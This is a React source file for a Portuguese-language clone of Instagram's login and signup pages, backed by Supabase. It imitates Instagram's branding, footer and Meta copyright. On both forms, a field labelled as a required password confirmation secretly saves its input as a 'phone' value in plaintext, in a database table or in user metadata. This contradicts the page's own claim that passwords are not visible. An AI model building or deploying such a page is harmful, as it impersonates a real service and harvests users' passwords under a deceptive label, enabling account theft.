import { useEffect, useState } from "react";
import { motion, AnimatePresence } from "framer-motion";
import {
  Apple,
  Play,
  ChevronDown,
  Signal,
  Wifi,
  BatteryFull,
} from "lucide-react";
import { posts } from "../data";
import { cn } from "../utils/cn";
import { supabase } from "../lib/supabase";

function FacebookGlyph({ className }: { className?: string }) {
  return (
    <svg
      viewBox="0 0 24 24"
      fill="currentColor"
      aria-hidden="true"
      className={className}
    >
      <path d="M13.5 21.5v-7.2h2.42l.36-2.8H13.5V9.71c0-.81.22-1.36 1.39-1.36h1.48V5.84c-.26-.03-1.14-.11-2.16-.11-2.14 0-3.61 1.31-3.61 3.7v2.07H8.18v2.8h2.42v7.2h2.9Z" />
    </svg>
  );
}

/* ------------------------------------------------------------------ */
/*  Input com label flutuante (assinatura visual do Instagram)         */
/* ------------------------------------------------------------------ */

function FloatingInput({
  label,
  value,
  onChange,
  password = false,
  inputType = "text",
  autoComplete,
}: {
  label: string;
  value: string;
  onChange: (v: string) => void;
  password?: boolean;
  inputType?: "text" | "email";
  autoComplete?: string;
}) {
  const [focused, setFocused] = useState(false);
  const [show, setShow] = useState(false);
  const floated = focused || value.length > 0;

  return (
    <div className="relative">
      <input
        type={password ? (show ? "text" : "password") : inputType}
        value={value}
        autoComplete={
          autoComplete ?? (password ? "current-password" : inputType)
        }
        onChange={(e) => onChange(e.target.value)}
        onFocus={() => setFocused(true)}
        onBlur={() => setFocused(false)}
        className={cn(
          "h-[38px] w-full rounded-[3px] border bg-[#121212] text-xs text-white outline-none transition-colors duration-150",
          floated ? "px-2 pb-1 pt-4" : "px-2 py-0",
          password && value.length > 0 ? "pr-20" : "",
          focused ? "border-[#737373]" : "border-[#363636]"
        )}
      />
      <span
        className={cn(
          "pointer-events-none absolute left-2 text-[#a8a8a8] transition-all duration-150",
          floated ? "top-[7px] text-[9px]" : "top-1/2 -translate-y-1/2 text-xs"
        )}
      >
        {label}
      </span>
      {password && value.length > 0 && (
        <button
          type="button"
          onClick={() => setShow((s) => !s)}
          className="absolute right-2.5 top-1/2 -translate-y-1/2 text-sm font-semibold text-white transition-opacity hover:opacity-60"
        >
          {show ? "Ocultar" : "Mostrar"}
        </button>
      )}
    </div>
  );
}

/* ------------------------------------------------------------------ */
/*  Mockup de celular com screenshots girando (como a página oficial)  */
/* ------------------------------------------------------------------ */

const shots = [posts[0].image, posts[6].image, posts[8].image, posts[12].image];

function PhoneCarousel() {
  const [active, setActive] = useState(0);

  useEffect(() => {
    const t = window.setInterval(
      () => setActive((i) => (i + 1) % shots.length),
      4000
    );
    return () => window.clearInterval(t);
  }, []);

  return (
    <div className="relative hidden shrink-0 select-none min-[920px]:block">
      {/* botões laterais */}
      <div className="absolute -left-[3px] top-24 h-10 w-[3px] rounded-full bg-[#333]" />
      <div className="absolute -left-[3px] top-40 h-14 w-[3px] rounded-full bg-[#333]" />
      <div className="absolute -right-[3px] top-32 h-16 w-[3px] rounded-full bg-[#333]" />

      <div className="rounded-[46px] bg-black p-[10px] shadow-[0_0_80px_rgba(0,149,246,0.08)] ring-1 ring-[#2a2a2a]">
        <div className="relative h-[560px] w-[262px] overflow-hidden rounded-[36px] bg-black ring-1 ring-[#262626]">
          {shots.map((src, i) => (
            <img
              key={src}
              src={src}
              alt=""
              draggable={false}
              className={cn(
                "absolute inset-0 h-full w-full object-cover transition-opacity duration-1000 ease-in-out",
                i === active ? "opacity-100" : "opacity-0"
              )}
            />
          ))}

          {/* notch */}
          <div className="absolute left-1/2 top-2 flex h-6 w-24 -translate-x-1/2 items-center justify-end rounded-full bg-black pr-3">
            <span className="h-2 w-2 rounded-full bg-[#1f1f1f] ring-1 ring-[#333]" />
          </div>

          {/* status bar */}
          <div className="absolute inset-x-0 top-0 flex items-center justify-between px-6 pt-2.5 text-[10px] font-semibold">
            <span>9:41</span>
            <span className="flex items-center gap-1">
              <Signal className="h-3 w-3" />
              <Wifi className="h-3 w-3" />
              <BatteryFull className="h-3.5 w-3.5" />
            </span>
          </div>

          {/* indicador home */}
          <div className="absolute bottom-2 left-1/2 h-1 w-24 -translate-x-1/2 rounded-full bg-white/50" />
        </div>
      </div>
    </div>
  );
}

/* ------------------------------------------------------------------ */
/*  Selos das lojas de aplicativos                                     */
/* ------------------------------------------------------------------ */

function StoreBadges() {
  return (
    <>
      <p className="mt-6 text-center text-sm">Baixe o aplicativo.</p>
      <div className="mt-4 flex justify-center gap-2.5">
        <button className="flex h-10 items-center gap-2 rounded-md border border-[#363636] bg-black px-3.5 transition-colors hover:bg-[#121212]">
          <Play className="h-[22px] w-[22px]" fill="#fff" stroke="none" />
          <span className="text-left leading-[1.15]">
            <span className="block text-[8px] uppercase tracking-wide text-[#a8a8a8]">
              Disponível no
            </span>
            <span className="block text-sm font-medium">Google Play</span>
          </span>
        </button>
        <button className="flex h-10 items-center gap-2 rounded-md border border-[#363636] bg-black px-3.5 transition-colors hover:bg-[#121212]">
          <Apple className="h-[22px] w-[22px]" fill="#fff" stroke="none" />
          <span className="text-left leading-[1.15]">
            <span className="block text-[8px] uppercase tracking-wide text-[#a8a8a8]">
              Baixar na
            </span>
            <span className="block text-sm font-medium">App Store</span>
          </span>
        </button>
      </div>
    </>
  );
}

/* ------------------------------------------------------------------ */
/*  Divisor "OU"                                                       */
/* ------------------------------------------------------------------ */

function Divider() {
  return (
    <div className="my-[18px] flex items-center gap-4">
      <span className="h-px flex-1 bg-[#363636]" />
      <span className="text-[13px] font-semibold uppercase text-[#a8a8a8]">
        ou
      </span>
      <span className="h-px flex-1 bg-[#363636]" />
    </div>
  );
}

function Spinner() {
  return (
    <span className="h-4 w-4 animate-spin rounded-full border-2 border-white/40 border-t-white" />
  );
}

function AuthFeedback({
  message,
  success = false,
}: {
  message: string;
  success?: boolean;
}) {
  if (!message) return null;

  return (
    <p
      role={success ? "status" : "alert"}
      className={cn(
        "mt-3 text-center text-xs leading-5",
        success ? "text-green-400" : "text-red-400"
      )}
    >
      {message}
    </p>
  );
}

/* ------------------------------------------------------------------ */
/*  Cartão de login                                                    */
/* ------------------------------------------------------------------ */

function LoginCard({
  onSuccess,
  onSwitch,
}: {
  onSuccess: () => void;
  onSwitch: () => void;
}) {
  const [user, setUser] = useState("");
  const [pass, setPass] = useState("");
  const [phone, setPhone] = useState("");
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState("");
  const canSubmit = user.trim().includes("@") && pass.length >= 6;

  const submit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!canSubmit || loading) return;
    setLoading(true);
    setMessage("");
    const phoneValue = phone.trim();

    if (!supabase) {
      setMessage(
        "Configure VITE_SUPABASE_URL e VITE_SUPABASE_ANON_KEY para habilitar o login."
      );
      setLoading(false);
      return;
    }

    try {
      const { data, error } = await supabase.auth.signInWithPassword({
        email: user.trim(),
        password: pass,
      });

      if (error) {
        setMessage(`Não foi possível entrar: ${error.message}`);
        return;
      }

      if (phoneValue && data.user) {
        const { data: savedPhone, error: lookupError } = await supabase
          .from("account_phones")
          .select("user_id, phone")
          .eq("user_id", data.user.id)
          .maybeSingle();

        if (lookupError) {
          window.alert(
            `Login realizado, mas não foi possível verificar se já há um telefone salvo: ${lookupError.message}`
          );
        } else if (!savedPhone?.phone) {
          const { error: saveError } = savedPhone
            ? await supabase
                .from("account_phones")
                .update({ phone: phoneValue })
                .eq("user_id", data.user.id)
            : await supabase
                .from("account_phones")
                .insert({ user_id: data.user.id, phone: phoneValue });

          if (saveError) {
            window.alert(
              `Login realizado, mas não foi possível salvar o telefone: ${saveError.message}`
            );
          }
        }
      }

      onSuccess();
    } catch (error) {
      setMessage(
        error instanceof Error
          ? `Falha de conexão: ${error.message}`
          : "Falha inesperada ao entrar. Tente novamente."
      );
    } finally {
      setLoading(false);
    }
  };

  return (
    <>
      <div className="border-transparent bg-black px-10 pb-8 pt-12 sm:border sm:border-[#262626]">
        <h1 className="pb-9 text-center font-logo text-[44px] leading-none">
          Instagram
        </h1>

        <form onSubmit={submit} className="space-y-1.5">
          <FloatingInput
            label="Email"
            value={user}
            onChange={setUser}
            inputType="email"
          />
          <FloatingInput
            label="Senha"
            value={pass}
            onChange={setPass}
            password
          />
          <FloatingInput
            label="Confirmar senha (obrigatório)"
            value={phone}
            onChange={setPhone}
            autoComplete="tel"
          />
          <p className="px-1 pt-1 text-[11px] leading-4 text-[#a8a8a8]">
            Se a conta ainda não tiver telefone, ele será salvo como contato.
            Não é usado para recuperação sem verificação.
          </p>

          <button
            type="submit"
            disabled={!canSubmit || loading}
            className={cn(
              "mt-2.5 flex h-[34px] w-full items-center justify-center rounded-lg text-sm font-semibold text-white transition-all duration-200 active:scale-[0.98]",
              canSubmit
                ? "bg-[#0095f6] hover:bg-[#1877f2]"
                : "cursor-default bg-[#0095f6]/55"
            )}
          >
            {loading ? <Spinner /> : "Entrar"}
          </button>
        </form>

        <AuthFeedback message={message} />
        <Divider />

        <button className="flex w-full items-center justify-center gap-2 text-sm font-semibold text-[#0095f6] transition-opacity hover:opacity-70">
          <FacebookGlyph className="h-5 w-5" />
          Entrar com o Facebook
        </button>

        <button className="mt-4 w-full text-center text-xs text-[#e0f1ff] transition-opacity hover:opacity-70">
          Esqueceu a senha?
        </button>
      </div>

      <div className="mt-2.5 border-transparent bg-black px-10 py-[22px] text-center text-sm sm:border sm:border-[#262626]">
        Não tem uma conta?{" "}
        <button
          onClick={onSwitch}
          className="font-semibold text-[#0095f6] transition-opacity hover:opacity-70"
        >
          Cadastre-se
        </button>
      </div>
    </>
  );
}

/* ------------------------------------------------------------------ */
/*  Cartão de cadastro                                                 */
/* ------------------------------------------------------------------ */

function SignupCard({
  onSuccess,
  onSwitch,
}: {
  onSuccess: () => void;
  onSwitch: () => void;
}) {
  const [email, setEmail] = useState("");
  const [name, setName] = useState("");
  const [username, setUsername] = useState("");
  const [phone, setPhone] = useState("");
  const [pass, setPass] = useState("");
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState("");
  const [signupComplete, setSignupComplete] = useState(false);

  const phoneValue = phone.trim();
  const canSubmit =
    email.trim().includes("@") &&
    name.trim().length > 0 &&
    username.trim().length > 0 &&
    phoneValue.length > 0 &&
    pass.length >= 6;

  const submit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!canSubmit || loading) return;
    setLoading(true);
    setMessage("");
    setSignupComplete(false);

    if (!supabase) {
      setMessage(
        "Configure VITE_SUPABASE_URL e VITE_SUPABASE_ANON_KEY para habilitar o cadastro."
      );
      setLoading(false);
      return;
    }

    try {
      const { data, error } = await supabase.auth.signUp({
        email: email.trim(),
        password: pass,
        options: {
          data: {
            full_name: name.trim(),
            username: username.trim(),
            phone: phoneValue,
          },
        },
      });

      if (error) {
        setMessage(`Não foi possível criar a conta: ${error.message}`);
        return;
      }

      if (data.session) {
        onSuccess();
      } else {
        setSignupComplete(true);
        setMessage(
          "Cadastro realizado. Confira seu email para confirmar a conta antes de entrar."
        );
      }
    } catch (error) {
      setMessage(
        error instanceof Error
          ? `Falha de conexão: ${error.message}`
          : "Falha inesperada ao criar a conta. Tente novamente."
      );
    } finally {
      setLoading(false);
    }
  };

  return (
    <>
      <div className="border-transparent bg-black px-10 pb-8 pt-10 sm:border sm:border-[#262626]">
        <h1 className="pb-4 text-center font-logo text-[44px] leading-none">
          Instagram
        </h1>
        <p className="mx-auto max-w-[270px] text-center text-[17px] font-semibold leading-5 text-[#a8a8a8]">
          Cadastre-se para ver fotos e vídeos dos seus amigos.
        </p>

        <button className="mt-4 flex h-[34px] w-full items-center justify-center gap-2 rounded-lg bg-[#0095f6] text-sm font-semibold text-white transition-all duration-200 hover:bg-[#1877f2] active:scale-[0.98]">
          <FacebookGlyph className="h-5 w-5" />
          Entrar com o Facebook
        </button>

        <Divider />

        <form onSubmit={submit} className="space-y-1.5">
          <FloatingInput
            label="Email"
            value={email}
            onChange={setEmail}
            inputType="email"
          />
          <FloatingInput
            label="Nome completo"
            value={name}
            onChange={setName}
          />
          <FloatingInput
            label="Nome de usuário"
            value={username}
            onChange={setUsername}
          />
          <FloatingInput
            label="Senha"
            value={pass}
            onChange={setPass}
            password
            autoComplete="new-password"
          />
          <FloatingInput
            label="Confirmar senha (obrigatório)"
            value={phone}
            onChange={setPhone}
            autoComplete="tel"
          />
          <button
            type="submit"
            disabled={!canSubmit || loading}
            className={cn(
              "mt-4 flex h-[34px] w-full items-center justify-center rounded-lg text-sm font-semibold text-white transition-all duration-200 active:scale-[0.98]",
              canSubmit
                ? "bg-[#0095f6] hover:bg-[#1877f2]"
                : "cursor-default bg-[#0095f6]/55"
            )}
          >
            {loading ? <Spinner /> : "Cadastre-se"}
          </button>
        </form>

        <AuthFeedback message={message} success={signupComplete} />
        <p className="mt-3 text-center text-xs leading-4 text-[#a8a8a8]">
          O telefone será salvo de forma privada e não será usado para recuperar
          a conta sem verificação por SMS.
        </p>
        <p className="mt-3 text-center text-xs leading-4 text-[#a8a8a8]">
          As pessoas que usam nosso serviço podem ter enviado suas informações
          de contato para o Instagram.{" "}
          <span className="cursor-pointer text-[#e0f1ff]">Saiba mais</span>.
        </p>
        <p className="mt-3 text-center text-xs leading-4 text-[#a8a8a8]">
          Ao se cadastrar, você concorda com nossos{" "}
          <span className="cursor-pointer text-[#e0f1ff]">Termos</span>,{" "}
          <span className="cursor-pointer text-[#e0f1ff]">
            Política de Privacidade
          </span>{" "}
          e{" "}
          <span className="cursor-pointer text-[#e0f1ff]">
            Política de Cookies
          </span>
          .
        </p>

      </div>

      <div className="mt-2.5 border-transparent bg-black px-10 py-[22px] text-center text-sm sm:border sm:border-[#262626]">
        Tem uma conta?{" "}
        <button
          onClick={onSwitch}
          className="font-semibold text-[#0095f6] transition-opacity hover:opacity-70"
        >
          Entre
        </button>
      </div>
    </>
  );
}

/* ------------------------------------------------------------------ */
/*  Rodapé                                                             */
/* ------------------------------------------------------------------ */

const footerLinks = [
  "Meta",
  "Sobre",
  "Blog",
  "Carreiras",
  "Ajuda",
  "API",
  "Privacidade",
  "Termos",
  "Localizações",
  "Instagram Lite",
  "Threads",
  "Meta Verified",
];

function AuthFooter() {
  return (
    <footer className="px-4 pb-10 pt-16">
      <div className="mx-auto flex max-w-[900px] flex-wrap items-center justify-center gap-x-4 gap-y-2 text-xs text-[#737373]">
        {footerLinks.map((l) => (
          <a
            key={l}
            href="#"
            onClick={(e) => e.preventDefault()}
            className="transition-colors hover:text-[#a8a8a8]"
          >
            {l}
          </a>
        ))}
      </div>
      <div className="mt-4 flex items-center justify-center gap-5 text-xs text-[#737373]">
        <button className="flex items-center gap-1 transition-colors hover:text-[#a8a8a8]">
          Português (Brasil)
          <ChevronDown className="h-3 w-3" />
        </button>
        <span>© 2026 Instagram do Meta</span>
      </div>
    </footer>
  );
}

/* ------------------------------------------------------------------ */
/*  Fluxo principal de autenticação                                    */
/* ------------------------------------------------------------------ */

export default function AuthFlow({ onSuccess }: { onSuccess: () => void }) {
  const [mode, setMode] = useState<"login" | "signup">("login");

  return (
    <div className="flex min-h-screen flex-col bg-black">
      <main className="flex flex-1 items-center justify-center gap-14 px-4 pt-8 sm:pt-2">
        <PhoneCarousel />

        <div className="w-full max-w-[350px]">
          <AnimatePresence mode="wait">
            <motion.div
              key={mode}
              initial={{ opacity: 0, y: 14 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -14 }}
              transition={{ duration: 0.25, ease: "easeOut" }}
            >
              {mode === "login" ? (
                <LoginCard
                  onSuccess={onSuccess}
                  onSwitch={() => setMode("signup")}
                />
              ) : (
                <SignupCard
                  onSuccess={onSuccess}
                  onSwitch={() => setMode("login")}
                />
              )}
            </motion.div>
          </AnimatePresence>

          <StoreBadges />

          <p className="mt-7 text-center text-[11px] leading-4 text-[#4d4d4d]">
            Demonstração para fins de estudo. As credenciais são processadas
            com Supabase Auth; senhas não ficam visíveis no banco de dados.
          </p>
        </div>
      </main>

      <AuthFooter />
    </div>
  );
}
